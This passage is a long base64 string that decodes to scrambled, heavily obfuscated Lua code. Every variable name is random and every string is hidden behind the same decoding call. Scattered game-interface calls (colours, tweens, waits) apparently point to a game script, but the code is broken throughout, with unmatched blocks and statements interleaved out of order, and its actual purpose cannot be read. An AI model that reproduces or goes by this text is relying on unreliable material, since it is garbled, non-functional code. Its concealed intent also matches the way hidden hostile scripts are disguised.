GVuZCkKICAgICAgICAgICAgICAgICgoRnNLeEtMZ2JOVylbInphUGJoVGhiUm4iXSgiUHRVRmpJbFNTSSIpKSwKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIC0tIFl4UklCV2J2ZlEgaVlUT3NUd0JERCBIZ0d5YkpURFFoCnhESE1Wd3FMbXEoKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIEZHTktmWkZSQ2kgPSBXU3ZxUmhUVlN3KGdjcGtrakdwWk8ud1NRT2lQY0hrSSkgSmRsbGRmRnl3WCAwLjUKICAgICAgICAgICAgICAgICAgICBkY1FKSlpwTWVEKAogICAgICAgICAgICBpZiBReXdmTEFTaEZQIHRoZW4KCikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgWUVVenRkZkN3RiA9IG5pbCAtLSBjZFpPTGNjbm5HIGRyS1VPdEJEZm0gV05Fc0d4aE1yQSBYTG5GVGFrTGhGIGFjYVZScUZ6SkogbmVqTGNsV2VJSCBWbkVndXVseFFYIFlpc1doc1NOQVogS3FwbmNCRkN5byBFeEFlS3NHZ0FSIGxrSlhvZVh5bkkKICAgIGVuZAogICAgICAgICAgICAtLSBiQ0tUTFRBTEpIIGJGenBnUFNnVUQgVVdmeUJsUVd1aSd6c1pWRkZ1R01LIGR3UnlBaUZjbUMgUVhDY2ZvdmxXRwogICAgICAgICAgICBjeVlVd1FaTHl5OnNPREZvenp3UHkobVZiam1meWRWbS54aFRvZ2plaWZoKGVpRkFudkVXVUMpKQogICAgICAgIE1xWW94RG9zSkcgPSAoKGdvSGxydk94TncpWyJ6YVBiaFRoYlJuIl0oInVwaGRxTWxIbXM9PSIpKSwKICAgICAgICB2R0xsQnpXZ0NqID0gKChRU0xIZUtKelVNKVsiemFQYmhUaGJSbiJdKCJYemVnZmdza0VJPT0iKSksCikKCiAgICBJQ0d2RXZrbEl6LkZrUUZpZ2NuT0UgPSB0cnVlCiAgICAgICAgICAgIHNzYkZBS21tSUMsCiAgICAgICAgICAgICAgICBsb2NhbCB6T2R3bUZ2TEpXID0gVFhIa1VGS2pIVTpad29vU2lqVUhLKFVXZnlCbFFXdWkuSFd2cUVWaUhtTS5VdVdLSEJxbEJlKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBTSmlpbmZnU3JWID0gYm1qQkNCeFhDcjpad29vU2lqVUhLKCgoYkNMU2tuRVdQTylbInphUGJoVGhiUm4iXSgiTGJtdndXVHFLWiIpKSkKICAgICAgICBNcVlveERvc0pHID0gKChmWVpjSkpzWUtJKVsiemFQYmhUaGJSbiJdKCJvYU5ISkZ3Sm95IikpLAopCk9JU25tdHRtZ1UgPSBmYWxzZSAtLSBaZEJlRmpZcFp4IG1GdUlrVUZqY3MKICAgICAgICAgICAgICAgIE5zamlpc1FGTlguVnNPYkh0VExmdy5YbUhydlN3S1VJID0gcm9pS1lrclhIdC5jbUJIYUdyd1ZGCiAgICAgICAgICAgICAgICBVc3JiSmxVTkhSOnZuV1NoeE1jdG0oKQogICAgICAgIENCd0xrUkdSanQgPSA4Ci0tIERkTWNzVEVQd2ogVWlkdUxzQXV0Vi1tdHBkQ0VjRURqCiAgICAgICAgaWYgQ3p3eFVvaFpYTyA9PSAoKEJCSGlYWUJuTkEpWyJ6YVBiaFRoYlJuIl0oImhQenJ0VXZacEY9IikpIEx6dW9jVkRzR3Igc3FDTXJJRGpTTC53U1FPaVBjSGtJID09ICgoRWRsck1HREJ3eSlbInphUGJoVGhiUm4iXSgiU1JCbEdWa2JBUSIpKSB0aGVuCiAgICByZXR1cm4KCiAgICBmdW5jdGlvbigpCi0tIEVCbXFmdmRtUFogVnBSRUlUaWRFbyBkUHd4UG1icG1kCi0tIC8vIC8vIC8vIFFuTFhpVlZPVWogSmtHb0pJbUhpSSAvLyAvLyAvLyAtLQogICAgcmV0dXJuIGl0Sm5Jd2NmQ1oKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdnl6UGFkc2xFYSA9IDEKICAgICAgICAgICAgICAgICAgICAtLSBUR0ZPVW9rVWJZIHdvZVJUWUxmeFQgZHJLVU90QkRmbSBDRXpuS1B3V2xVIEdlb0tzY2VkeFggYnBZaW1RandGVSBhVFdJUm9mWXZyCiAgICAgICAgZHlsTUt4Z2VMSjp1Rk1qV2p1cVpFKCkKICAgICAgICBlbmQKLS0gUmJPT0tSZlR5ViBBclZ0Ym5hREV5CgogICAgICAgICAgICBsb2NhbCBZZVJLYm5xaWhIID0gewogICAgZ0RacWhUbXBxZwpsb2NhbCBReXdmTEFTaEZQLCBaZHNsbFhSZlpqID0gbmlsLCBuaWwKICAgICAgICBpZiBJQ0d2RXZrbEl6IHRoZW4KICAgIH0KbG9jYWwgalVyUk5ncXNRTCA9IEVTaFhIUnFIcEo6ZU1JQmtzTG9EUigoKElSUlZ0WENrUUUpWyJ6YVBiaFRoYlJuIl0oIk90Q2liTmZ2T2g9PSIpKSwgewoKICAgICAgICAgICAgICAgICAgICByQ254R3RsQ1hROnB3WUhrUlF5SGYodHJ1ZSwgV2pZclpraEtWTS5DdVBrQm53aml5Lm9oVVJLTWpyRWcsIGZhbHNlLCBES2ZLUlhqV1JlKQpsb2NhbCBxY09vQlRPWFNDID0KICAgIHltRGNBeWhGa0suaElDckFaVXFsZCA9IFFYQ2Nmb3ZsV0cKCgp9CgogICAgICAgICAgICAgICAgICAgICAgICB5SllHZFZqemVHLlNUQmJIQmdmS0soYXRQcFpvekpaZywgMSwgWFVEbmVUeWNzaykKICAgICAgICAgICAgICAgICAgICBpZiBYbHd6bGp2WVphIEx6dW9jVkRzR3IgWGx3emxqdllaYTpWd0l2aEV3Tkt2KCgoR2FmQ1lZS0RxVClbInphUGJoVGhiUm4iXSgiTEN4aUJmYk9Ccz0iKSkpIHRoZW4KICAgICAgICAgICAgZW5kCmVuZAogICAgICAgIGJTZXlqeXdkRU8oMC4xKSAtLSBBRWd6S09NSUN1IFBSUmRJdlZseGwgblVsS3dSWldWYSBSYVlHaUV6WHBJIEV5VFhOZG5CVEQKdWZ4UnlzRGJsazpFaWFjVWJPS2pJKFFuTFhpVlZPVWouR1VBUVdjZVpVYikKKQogICAgSVdESlBDZGd2Ry5PUVBNaHVMb0ZnOmtqYXFqekRuQmwoCiAgICAgICAgICAgICAgICAgICAgQ3p3eFVvaFpYTyA9IFlUcXp5eGpvemQgTHp1b2NWRHNHciBZVHF6eXhqb3pkLndTUU9pUGNIa0kgSmRsbGRmRnl3WCBuaWwKbG9jYWwgYnlaU3JaUkp0VCA9ICgoWXlseGF4b29RailbInphUGJoVGhiUm4iXSgiV09BRkp1ZEFCRyIpKQogICAgICAgICAgICBJTmJUWVJqR1RhID0KICAgICAgICBsYXdrV0FWVWhaID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgod0V6TGFQTWFlRilbInphUGJoVGhiUm4iXSgibHJVZEdEaUJmYyIpKSk6YlVhdnh4TGRwdCgxNjczMjY5NDA1MikuVXVXS0hCcWxCZSAuLiAoKEphaXV5Rm5WWFApWyJ6YVBiaFRoYlJuIl0oIlBCTlpmUEdyUWM9PSIpKSwKICAgICAgICAtLSBXTFZIRUlZeExaIGFjSGlrVGtjeVogckZJQmNvcmRYQiBOSWt3cVhtenBOJCBEbXZ0TExMTEpyIFF6RmR0Z2NjV00gSFp5SFd6SWJQdiBhcUhSeXh6ZmZFIEt2aGNGdk94YVQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgQmJQdnZFU2pzSSB0aGVuCmxvY2FsIE5zamlpc1FGTlggPSBXcUJXVXZqckhTOkJTaURtU0tIU3MoKChYVVVuZWF5ZkhnKVsiemFQYmhUaGJSbiJdKCJ6VEdKZ3ptZFB5PT0iKSkpCiAgICB7CgogICAgfQogICAgICAgIFdaSUtmWERtZ0ogPSAoKFNEd3FZTVR4Y20pWyJ6YVBiaFRoYlJuIl0oImdGVWl5SlR6TXoiKSksCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoam5YS3BRVFp1UClbInphUGJoVGhiUm4iXSgieUFvbHNGZmhqcT0iKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKc3NiRkFLbW1JQy54SW1qV2dQTHBZID0gdHJ1ZQogICAgICAgIEp6anpmcWh5eEwgPSB0SGVvdmhKa1JBCiAgICBlbmQKICAgICAgICAgICAgaWYgTnNqaWlzUUZOWDpad29vU2lqVUhLKCgoaktwWENQRXNYbClbInphUGJoVGhiUm4iXSgiSmxNbUx0T25XQj0iKSkpIEx6dW9jVkRzR3Igcm9pS1lrclhIdC5oY1N2WkxjQ3dTIHRoZW4KbG9jYWwgZnVuY3Rpb24gVEFpaElRampXaSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBGR05LZlpGUkNpID0gV1N2cVJoVFZTdyhqcUVVREVFYVdGLndTUU9pUGNIa0kpIEpkbGxkZkZ5d1ggMAogICAgICAgICAgICAgICAgaWYgQURDblNHbnJ0UTpWd0l2aEV3Tkt2KCgobFNzeUJSQmZmTilbInphUGJoVGhiUm4iXSgiR2hUcG1nZlBMSD0iKSkpIHRoZW4KCiAgICAgICAgICAgICAgICAgICAgREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoTElpWUFhcmd3SylbInphUGJoVGhiUm4iXSgiZ01Md2V1c3p0ZT0iKSkpLlZ5TGlaaE9iTU8gPSAoKG1BekdBYm5zRUcpWyJ6YVBiaFRoYlJuIl0oIkR5VU9XWVNDcHE9IikpCnBGZHpNYWxiTHcuWERZcWtXRUdZciA9IFdqWXJaa2hLVk0uWERZcWtXRUdZci5DdEpxc1RncXlzIC0tIEVCRnZQcFNWVFMgRmxRaUNyek53VCBMZmR3cXZYcWl5CikKLS0gLS0gdlVGRUdVVklVRyBuYXVTcXFzeUtDICgoeldPcEV3a0V3SSlbInphUGJoVGhiUm4iXSgiWm90aWtQVGlVSyIpKQogICAgICAgIGxhd2tXQVZVaFogPSAoKGNiSUZKdEptVmspWyJ6YVBiaFRoYlJuIl0oImtZTm9RQVNLQ1A9IikpLAogICAgbG9jYWwgSkhCWUhjckN5UyA9IHt9ICAtLSBVaHhXZHpCekltIEFCSUFlQmVXbU8gRElnb0xDUkROciAoKFFTTEhlS0p6VU0pWyJ6YVBiaFRoYlJuIl0oIlh6ZWdmZ3NrRUk9PSIpKSBkcktVT3RCRGZtIGZqSkdsTmxaeVUgemh2VmdkVXJXVSBpYm5Ua0tvRGZOCiAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygxKQogICAgfQogICAgICAgICAgICBpZiBOc2ppaXNRRk5YOlp3b29TaWpVSEsoKChqS3BYQ1BFc1hsKVsiemFQYmhUaGJSbiJdKCJKbE1tTHRPbldCPSIpKSkgdGhlbgogICAgICAgICAgICAgICAgICAgIFhVQkJua0FFencsCiAgICAgICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBkTFFkbGJzWmt3IG10cGRDRWNFRGogZElWUU5Jd1hsSyhvY0x3d1NiRnd2KSBwWWlpV1pHVUJyCiAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgIGVuZAphb2VDbnRWaXlxLm10WU1DWktnZkEoCgogICAgICAgICAgICAtLSBNQ1p3em9jamthIFl3Y1lTTVBuUE4gdU5LTnNGZmthciBSYVlHaUV6WHBJIGxKbW12dENTS2MKbG9jYWwgWGdvdkRoeVRiWSA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKHViamxsZ2pGeFEpWyJ6YVBiaFRoYlJuIl0oIlpWRVFVRnNmREY9IikpKQpHRHNYbGpvVnNMOlJZd0FiREZmaUkoCiAgICAgICAgICAgICAgICAgICAgbGlod0J5dE5qeC54Qm1wcXJLbGxLID0gV2FLR1FzVnRMWApRZWJobmJURW5CLnhCbXBxcktsbEsgPSBXTU9qZ21YbFdICiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLm10WU1DWktnZkEoClFlYmhuYlRFbkIuc3ptaHdxcnBydCA9IFJ6S3dKT1ZRZW0ueGhUb2dqZWlmaCgwLjUsIDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFpacnZpWExjQUwoKChTbnd2S0RKRWNRKVsiemFQYmhUaGJSbiJdKCJValpacUVLRXh4PT0iKSksIEJNY1lCQlFsTFIpCiAgICBsb2NhbCB5dHJ2QWluVlduID0gWGdvdkRoeVRiWS5udmRxZHVoeVdCW0trek9pU0Jqc2wuVXVXS0hCcWxCZV0uVEdaeVV5SHBhTi5BTk9YSU9YUVZ2LndTUU9pUGNIa0kKICAgICAgICBNcVlveERvc0pHID0gKChpT0JSS0x4QmV0KVsiemFQYmhUaGJSbiJdKCJweU1nTE5tdW5aPT0iKSksCiAgICBpZiBJQ0d2RXZrbEl6IHRoZW4KbG9jYWwga0NmRWJBeGR6QyA9IHRydWUKTE9qWnBGU3FQVC5MSUJ2aWtKdmtYID0gVnBtaU5GWGFnTy54aFRvZ2plaWZoKDYsIDEsIDYpIC0tIHhEWkhBVGpJdlggZHJLVU90QkRmbSB6aHZWZ2RVcldVIEh6VFZQa0VCSEogSmJSbkRGQnR0UgogICAgICAgIGxvY2FsIEhXU1NrQUd1WnUgPSBUTEhXcVRueUZKLlZSU01oSmdNUWMocUFBQ3hlcGNCQSgpIC0gZm96YUhQbEVJVykKWmRCZUZqWXBaeDpSWXdBYkRGZmlJKAopCikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICByZXR1cm4gYm1qQkNCeFhDciB+PSBuaWwKICAgICAgICAgICAgICAgICAgICBlbmQKbG9jYWwgSU5iVFlSakdUYSA9IG5pbAogICAgKChkUGhuZGNxRk1PKVsiemFQYmhUaGJSbiJdKCJ0Q0t6ZVJydmJQIikpLAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgfQogICAgICAgIGxvY2FsIGV6YnlwRldhcEggPSBZV0tQa2loUWZVLndTUU9pUGNIa0kKICAgICAgICAgICAgICAgIGVuZAogICAgICAgIGxvY2FsIGlxbHRrWHdsT0YgPSBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbDpad29vU2lqVUhLKCgockFoVlpKUExSRylbInphUGJoVGhiUm4iXSgiWWVPVHlSaXRaWD0iKSkpCi0tICAgICBBdWtlRGNOdUZxLnhoVG9namVpZmgoMSwgYWtSQm1wRldIdi5BZ3VmWnNhVEJ5KDMwLCAzMCwgODApKSAgICAtLSBzVEpaQnFhR3N1IG9kanlMVERaZ1cgKGpQZWVic2JXa00pCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoTG9mWnNZRlRkeilbInphUGJoVGhiUm4iXSgibExzWnFKQUN6aj09IikpLApsb2NhbCBIR0lyUXZ6T3l1ID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoa0JkYUVPYWRzQilbInphUGJoVGhiUm4iXSgicnFTanpZWUhORz09IikpKS5La3pPaVNCanNsOlp3b29TaWpVSEsoKChsT3ZUenBncnZPKVsiemFQYmhUaGJSbiJdKCJsUXFWYXh0UHJaIikpKQpRZWJobmJURW5CLmhJQ3JBWlVxbGQgPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMC4xLCAwLCAwLjIsIDApIC0tIFpBcERZRmJieG4gWExuRlRha0xoRgogICAgICAgICAgICAgICAgRmdMblZ4SWVrcy5IV2xTT21ja0pKID0gYWtSQm1wRldIdi5BZ3VmWnNhVEJ5KDI1NSwgMjU1LCAyNTUpCiAgICAoKFJMTHRqb2RIS1ApWyJ6YVBiaFRoYlJuIl0oIkJFSmZVQkVmQmI9IikpLAogICAgICAgICAgICAgICAgRmdMblZ4SWVrcy5jcmVya0xXWm95ID0gYWtSQm1wRldIdi5BZ3VmWnNhVEJ5KDI1NSwgMjU1LCAyNTUpCnNzYkZBS21tSUMueEJtcHFyS2xsSyA9IHZjQWhXRnVBTUkKICAgIGVuZApIR0lyUXZ6T3l1LklWcUt6VGtSck86a2phcWp6RG5CbCgKLS0gUmdNUFFod0NNZS5oSUNyQVpVcWxkID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAuMDgsIDAsIDAuNSwgLTEyKSAtLSBOTHFwa1loS2pPIHNxZVZUWWF5anUgVE12cW91V1RMZCBFQXFSaVpBWUxlCgogICAgICAgIGlmIHFzbEdCc0hHQlYgQ3p3eFVvaFpYTyB0aGVuCiAgICB9CiAgICAgICAgKQogICAgICAgICkgLS0gQVVvV0RMWHJLZQogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgQ1p4TXV5SXpBby56SExVR1N2bHRkID0gQURDblNHbnJ0UQoKICAgIGZ1bmN0aW9uKCkKICAgIGVuZCwKICAgICAgICApCi0tIGlqR3ZVTnNGWkQgUUJ5eGlLd2hRUgogICAgICAgICAgICBlbmQKbG9jYWwgZnVuY3Rpb24gZlVQVXRFT0pNSigpCiAgICAgICAgICAgICAgICBsYXdrV0FWVWhaID0gKChzbERZZ1ZMcUJTKVsiemFQYmhUaGJSbiJdKCJnZm1VcGxSemprPSIpKSwKICAgICAgICAgICAgICAgICAgICBlbmQKbG9jYWwgc0Z3eFVockVtWSA9IFdwcVVYZmdKWEw6Wndvb1NpalVISygoKHJrUXRVcWZmTFEpWyJ6YVBiaFRoYlJuIl0oImZpaEVkY0lwSU49IikpKTpCU2lEbVNLSFNzKCgoRnFGdUdTcUlmUSlbInphUGJoVGhiUm4iXSgiTkZMVWp4RWRORj09IikpKQplbmQKc3NiRkFLbW1JQy5semJxTFd4bVFoID0gYWtSQm1wRldIdi5BZ3VmWnNhVEJ5KDE4NiwgMTE1LCAyMTEpIC0tIENTYkJPZ0tZckIgZlV0cnJSaFNPYyBHdXNFbWJTSnpHCmxvY2FsIFZQbVFrYkhYbHAgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChrQmRhRU9hZHNCKVsiemFQYmhUaGJSbiJdKCJycVNqellZSE5HPT0iKSkpLktrek9pU0Jqc2wKICAgICAgICAgICAgICAgICAgICBpZiBNcVpiTGJKZklJIHRoZW4KICAgICAgICBvRUxPVkZoU1d4ID0gKChBaGh1R2xvd0VWKVsiemFQYmhUaGJSbiJdKCJUdmdic3F3Y2RyPT0iKSksCi0tIFJnTVBRaHdDTWUueEJtcHFyS2xsSyA9IFFlYmhuYlRFbkIKaWYgREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoU2hSQllLTHhQWClbInphUGJoVGhiUm4iXSgiWHdNYlNac2VXcz09IikpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBpZiBJb2JTZWppTkdSOlZ3SXZoRXdOS3YoKCh2cklERk5LZGdkKVsiemFQYmhUaGJSbiJdKCJ5Sk9Md21xcUt2IikpKSB0aGVuCmxvY2FsIFFJaXFUWFRlbm4gPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh1YmpsbGdqRnhRKVsiemFQYmhUaGJSbiJdKCJaVkVRVUZzZkRGPSIpKSkucENud0RlZ0tRbi5VV0NRcUhCbFp5LkdHUGtGVURDTXkKICAgIGlmIHd5WmVZWFhtSFYgTHp1b2NWRHNHciBBRENuU0ducnRROlZ3SXZoRXdOS3YoKChmWVpvcVJoWVVNKVsiemFQYmhUaGJSbiJdKCJJc1VWUmRMcVB1PT0iKSkpIEx6dW9jVkRzR3Igc0Z3eFVockVtWTpad29vU2lqVUhLKGVZdHVNRHFBbFIpIH49IG5pbCB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBBWFhCSnlWT1NiIHRoZW4KICAgICgoRVdRZ2xIWEZJRClbInphUGJoVGhiUm4iXSgiRXpvamVnSW9IRD09IikpLAogICAgfSwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgLS0ga0lGeGlFdVdFQSBVeUhzTmlBWlVHIElhbGpFdW1UR3kgaENhbEVyRGZGRCBIWnlIV3pJYlB2IFZRSWhyTU9qbUggY3RjZlJya2NRayBhTEpVeEZsU3NZCmxvY2FsIHprU0p6VFZOUkUgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChhcnJhbHd3WEdQKVsiemFQYmhUaGJSbiJdKCJaSWFyQ2RzeGRvPT0iKSkpCiAgICBlbmQKICAgICgoUWdJSER1SmtwZilbInphUGJoVGhiUm4iXSgib1hEWlVUemdvZCIpKSwKICAgICAgICAgICAgICAgICgodkp4b0FxalJ1TClbInphUGJoVGhiUm4iXSgielNQTVlnT0FxVSIpKSAuLiAjYXRQcFpvekpaZyAuLiAoKFRXU29UTUZ0V1kpWyJ6YVBiaFRoYlJuIl0oIlFpbWdQWkFtb3c9IikpCmxvY2FsIGZ1bmN0aW9uIEZTdHpsRHZuTkMoKQoKfSkKICAgICAgICAgICAgICAgICAgICBBRENuU0ducnRRLlVuVmZLZ1FhWmwgPSB0cnVlCgogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIE1xWW94RG9zSkcgPSAoKFFVWlRxRlBId08pWyJ6YVBiaFRoYlJuIl0oImtqQnNQTE5Pd3I9IikpLApsb2NhbCBmdW5jdGlvbiBJd2ZiZldOUWJuKCkKICAgIHsKICAgICAgICAgICAgaWYgSW9iU2VqaU5HUjp2VXlWWlRQaERlKHRIZW92aEprUkEsIDEsIHRydWUpIHRoZW4KICAgIGxvY2FsIFBXR2NPam5vSmUgPSBUTEhXcVRueUZKLlZSU01oSmdNUWMocVVZYUxrRk9lTyAvIDM2MDApCiAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKFdYdEt5Q3Nva1ApWyJ6YVBiaFRoYlJuIl0oIlhWcXhyWnZRQWY9PSIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBRbkxYaVZWT1VqLnFLd1VhaVZqc0k6ZU1JQmtzTG9EUigKICAgICAgICAgICAgICAgICAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCiAgICBpZiBLT3BHRmxLV0RyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFhVRG5lVHljc2s6VndJdmhFd05LdigoKEdmWk1XSklMeEIpWyJ6YVBiaFRoYlJuIl0oIlJ1V1R6clBRSVY9PSIpKSkKICAgIGl0Sm5Jd2NmQ1oud1BTc054aHp0UiA9IHp2QnhOdnJWc1YKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoRndCZHRkY3ZBbSlbInphUGJoVGhiUm4iXSgicW1IYk5vRGp6Qj09IikpLAogICAgICAgICAgICAgICAgICAgIG1iZU9acEV3WHkubWJSbHZPQXdUWiA9IFRMSFdxVG55RkouVEFIbVJmaFR4ZQogICAgeUpZR2RWanplRy5TVEJiSEJnZktLKEpIQllIY3JDeVMsIDEsICgoUVNMSGVLSnpVTSlbInphUGJoVGhiUm4iXSgiWHplZ2Znc2tFST09IikpKQogICAgICAgIGlmIHFzbEdCc0hHQlYgZWdNTVNWRExmcyBMenVvY1ZEc0dyIEN2YW90ZUtqaVMgdGhlbgogICAgICAgIGFuVG56QW9DaXogPSB0cnVlLAotLSAvLyAvLyAvLyBsSWluc1R4cXhoIC8vIC8vIC8vIC0tCikKKQpsb2NhbCBZV0tQa2loUWZVID0gUW5MWGlWVk9Vai5NSXlGQ3lXeUpPOml2VXJKWHdrblooKChnb1RvbG5LTXhhKVsiemFQYmhUaGJSbiJdKCJzTWliYkVDQmxiIikpLCB7bGF3a1dBVlVoWiA9ICgoc2h1RlNSR2twSSlbInphUGJoVGhiUm4iXSgiWHd6Z29PS1BKSj09IikpLCBNcVlveERvc0pHID0gKChDWURBSXNzZUJGKVsiemFQYmhUaGJSbiJdKCJIc0xZcEZlVWpwIikpLCB2R0xsQnpXZ0NqID0gdHJ1ZX0pCiAgICAgICAgICAgICAgICBHcFhXc0RzalBkID0gQU5Vd0hiVXVTYwotLSBIVWZVRFVJVnJyLnhCbXBxcktsbEsgPSBRZWJobmJURW5CIC0tIFRKZEdTblZoakogTXV6U21JQm51cCBLdG5iWUZ0UUNXIGN0Y2ZScmtjUWsgUWViaG5iVEVuQgogICAgUW5MWGlWVk9Vai5xS3dVYWlWanNJOml2VXJKWHdrblooCiAgICAgICAgICAgICAgICAgICAgICAgIGxpaHdCeXROanggPSBuaWwKLS0gWmFHUFlkZmhIUiBTRU9adUZ0cHhmIGtIS1lWRUVGSWIgSW9iU2VqaU5HUgpsb2NhbCBHcFhXc0RzalBkID0gMQogICAgICAgIGxhd2tXQVZVaFogPSAoKGxiYmVpVGpFYWcpWyJ6YVBiaFRoYlJuIl0oImltYXd1Tk5XdVg9PSIpKSwKICAgICAgICB1elNsVmJQUmlHKGZhbHNlKQogICAgICAgICAgICBlbmQKKQogICAgICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbigpCiAgICAoKGdzd1hZdlRDVVIpWyJ6YVBiaFRoYlJuIl0oIlBKVHNTb05MbWQ9PSIpKSwKICAgICAgICAgICAgICAgICAgICBqd1F4eEpYaG9tID0gVFhIa1VGS2pIVS5QWVdpRExZZFBDLkpNWlVIQk9jeWo6Wndvb1NpalVISygoKEhqZUlYREllZFQpWyJ6YVBiaFRoYlJuIl0oImp5R2NLWWt6elM9IikpKQogICAgICAgICAgICAgICAgeGZ6YU1JVnZuQjpEa0ZIdXBocktrKCkKICAgIGVuZAoKLS0gLy8gQmVteE5FaE5yWiB1ZWlLRnJBbE1jIC8vIC0tCiAgICAgICAgICAgICAgICBsb2NhbCBJVm9pd3R0SFVkID0KQllvVm1VSWtEYS5FaVhsZnJCSGNuOmtqYXFqekRuQmwoCiAgICBlbmQKICAgIGxvY2FsIFJnTXd3T2dYeksgPSBUWEhrVUZLakhVOlp3b29TaWpVSEsoKChya1F0VXFmZkxRKVsiemFQYmhUaGJSbiJdKCJmaWhFZGNJcElOPSIpKSk6Wndvb1NpalVISygoKEZxRnVHU3FJZlEpWyJ6YVBiaFRoYlJuIl0oIk5GTFVqeEVkTkY9PSIpKSkKICAgICAgICAgICAgICAgICAgICBaWnJ2aVhMY0FMKCgod0ZIZFJwU2NHSSlbInphUGJoVGhiUm4iXSgiaGV2aWxrREZIaT0iKSkgLi4gSUh2dG5nTE9mUihyZHlOcW95RFZ2KSkKICAgICAgICBsb2NhbCBZVHF6eXhqb3pkID0KICAgICAgICBMSUJ2aWtKdmtYID0gUGZ1RlRzckVLWS5sSmFvQWdUbFJKKDQ5MCwgMzUwKSwgLS0gcFVQRlJ4Q2lMZSBSdXBvVENmdldmIG1GVXJvclNsdkwgZHJLVU90QkRmbSBSdXBvVENmdldmIGNneUVicnRsYmYKICAgICAgICB4SGxleUNTQ0F5Om1GRkJzckN0REkoV2pZclpraEtWTS5ZSGhtUUREQm5DLklOWGdMR0tKUWUsIGZhbHNlKQogICAgICAgICAgICApCiAgICAgICAgeEhsZXlDU0NBeS50SXFwSlZQTlZ1ID0gZmFsc2UKICAgICAgICAtLSBBVW9XRExYcktlIFlpc1doc1NOQVogaENhbEVyRGZGRCByS1hpSUxEaHppCgpwRmR6TWFsYkx3LmFPSmZEUXR4TGM6a2phcWp6RG5CbChmdW5jdGlvbigpCiAgICAgICAgZW5kCgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKHZwdlhrZFl2VnApWyJ6YVBiaFRoYlJuIl0oIkVYVGZHZWhhZEk9PSIpKSB0aGVuCiAgICAgICAgfQogICAgICAgIHJXZE16S3FGVGooKQpsb2NhbCBSTVdXS2ZXbU16ID0gb1RrS2lRbWZHbC5STVdXS2ZXbU16Cn0KICAgICAgICAgICAgICAgICAgICAgICAgbU90V0ZQTkpqUyA9IG1WYmptZnlkVm0ueGhUb2dqZWlmaChqd1F4eEpYaG9tLm1WYmptZnlkVm0uaElDckFaVXFsZCArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA3NCwgMCkpCiAgICBxcUxhVU1lbmlwID0gewogICAgICAgIGVuZAogICAgewogICAgbGF3a1dBVlVoWiA9ICgoQVRsakJtWnlqYylbInphUGJoVGhiUm4iXSgiU25wWkFybmdPeCIpKSwKbG9jYWwgZnVuY3Rpb24gbHVObGh4WWd3bSgpCgoKICAgICAgICAgICAgICAgICAgICAgICAgU1phQ0tnVG1TSS5tVmJqbWZ5ZFZtID0gc0Z3eFVockVtWVtlWXR1TURxQWxSXS5tVmJqbWZ5ZFZtCiAgICAgICAgKChaS2JVTEx6Q1VuKVsiemFQYmhUaGJSbiJdKCJMUG5lekxPY0hoPT0iKSksICgoeEt0ZGVUaVNqQylbInphUGJoVGhiUm4iXSgiem9RZmViS0VoRT09IikpLCAoKEV0bGVBWmlyU1YpWyJ6YVBiaFRoYlJuIl0oIlZvWmtxVXBwSVkiKSksICgoUWd3UVhBVGhqdClbInphUGJoVGhiUm4iXSgic2lNR2JjQUJSSD0iKSksCiAgICAgICAgICAgIGlmIGFLcW5pS3R3S0Mud1NRT2lQY0hrSSB0aGVuCiAgICAoKExIZkRBeFdZaHkpWyJ6YVBiaFRoYlJuIl0oImdUUFBTSmVqVnA9PSIpKSwKICAgICAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oKQogICAgICAgIGRHZnBVWklERUYgcXNsR0JzSEdCViBGTm1Fd0duenVPIEx6dW9jVkRzR3IgcUFBQ3hlcGNCQSgpIC0gZm96YUhQbEVJVyA8IDEwIHBZaWlXWkdVQnIKIC